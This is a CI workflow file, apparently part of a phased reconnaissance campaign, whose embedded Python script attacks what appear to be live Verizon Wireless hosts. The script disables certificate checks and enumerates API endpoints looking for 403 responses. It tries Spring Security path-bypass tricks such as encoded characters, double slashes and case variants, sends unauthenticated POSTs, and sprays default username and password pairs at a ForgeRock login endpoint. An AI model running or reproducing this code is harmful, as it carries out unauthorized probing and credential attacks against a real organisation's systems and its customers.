name: EMAG Phase 16
on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  phase16:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: EMAG Phase 16
        run: |
          python3 - << 'PYEOF'
          import urllib.request, urllib.error, json, ssl
          ctx = ssl.create_default_context()
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          BASE = "https://ess.emag.verizonwireless.com"
          
          def get_raw(url, hdrs=None, maxb=512):
              h = {"User-Agent": "Mozilla/5.0"}
              if hdrs: h.update(hdrs)
              rq = urllib.request.Request(url, headers=h)
              try:
                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                  with op.open(rq, timeout=10) as r:
                      b = r.read(maxb).decode(errors="replace")
                      is_html = b[:100].lower().count("<html") > 0
                      return r.status, is_html, b
              except urllib.error.HTTPError as e:
                  b = e.read(512).decode(errors="replace")
                  is_html = b[:100].lower().count("<html") > 0
                  return e.code, is_html, b
              except Exception as e:
                  return 0, False, str(e)
          
          def post(url, body, ct="application/json", hdrs=None):
              h = {"User-Agent": "Mozilla/5.0", "Content-Type": ct}
              if hdrs: h.update(hdrs)
              data = body.encode() if isinstance(body, str) else body
              rq = urllib.request.Request(url, data=data, method="POST", headers=h)
              try:
                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                  with op.open(rq, timeout=10) as r:
                      b = r.read(512).decode(errors="replace")
                      return r.status, b
              except urllib.error.HTTPError as e:
                  return e.code, e.read(512).decode(errors="replace")
              except Exception as e:
                  return 0, str(e)
          
          print("=== More API endpoint discovery (looking for 403s) ===")
          api_paths = [
              "/emag/api/message",
              "/emag/api/draft",
              "/emag/api/contacts",
              "/emag/api/contact",
              "/emag/api/groups",
              "/emag/api/group",
              "/emag/api/surveys",
              "/emag/api/survey",
              "/emag/api/schedule",
              "/emag/api/settings",
              "/emag/api/users",
              "/emag/api/user",
              "/emag/api/account",
              "/emag/api/me",
              "/emag/api/profile",
              "/emag/api/token",
              "/emag/api/auth",
              "/emag/api/login",
              "/emag/api/logout",
              "/emag/api/broadcast",
              "/emag/api/send",
          ]
          for path in api_paths:
              s, is_html, b = get_raw(BASE + path)
              if s == 403:
                  print(f"[{s}] REAL ENDPOINT {path}: {b[:100]}")
              elif s != 200:
                  print(f"[{s}] {path}: {b[:80]}")
              else:
                  if not is_html:
                      print(f"[{s}] NON-HTML {path}: {b[:100]}")
          
          print()
          print("=== Spring Security path bypass attempts ===")
          bypass_paths = [
              "/emag/api/messages%0a",
              "/emag/api/messages%09",
              "/emag/api/messages%20",
              "/emag/api/messages/",
              "/emag/api/messages;/",
              "/emag/api/messages//",
              "/emag/api/messages%2f",
              "/emag/api//messages",
              "/emag/api/./messages",
              "/emag/api/%2e/messages",
              "/EMAG/api/messages",
              "/Emag/api/messages",
              "/emag/API/messages",
              "/emag/api/MESSAGES",
          ]
          for path in bypass_paths:
              s, is_html, b = get_raw(BASE + path)
              if s not in (403, 404) or not is_html:
                  print(f"[{s}] INTERESTING {path}: html={is_html} {b[:100]}")
              else:
                  print(f"[{s}] {path}")
          
          print()
          print("=== POST to API endpoints without auth ===")
          for path in ["/emag/api/messages", "/emag/api/messages/send"][:]:
              s, b = post(BASE + path, chr(123)+chr(125), "application/json")
              print(f"[{s}] POST {path}: {b[:150]}")
          
          print()
          print("=== ForgeRock non-admin user attempts ===")
          fr_base = "https://mblogin.verizonwireless.com"
          auth_url = fr_base + "/vzauth/json/realms/root/authenticate"
          for user, pwd in [
              ("demo", "demo"),
              ("demo", "changeit"),
              ("test", "test"),
              ("guest", "guest"),
              ("emag", "emag"),
              ("admin", "admin"),
              ("user", "user"),
          ]:
              rq = urllib.request.Request(auth_url, method="POST",
                  headers={"X-OpenAM-Username": user, "X-OpenAM-Password": pwd,
                           "Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                           "Accept-API-Version": "resource=2.1,protocol=1.0"})
              try:
                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                  with op.open(rq, timeout=10) as r:
                      d = json.loads(r.read(4096))
                      print(f"[{r.status}] {user}:{pwd}: {str(d)[:100]}")
              except urllib.error.HTTPError as e:
                  d = json.loads(e.read(512))
                  print(f"[{e.code}] {user}:{pwd}: {str(d)[:80]}")
              except Exception as e:
                  print(f"[ERR] {user}:{pwd}: {e}")
          
          print("DONE")
          PYEOF
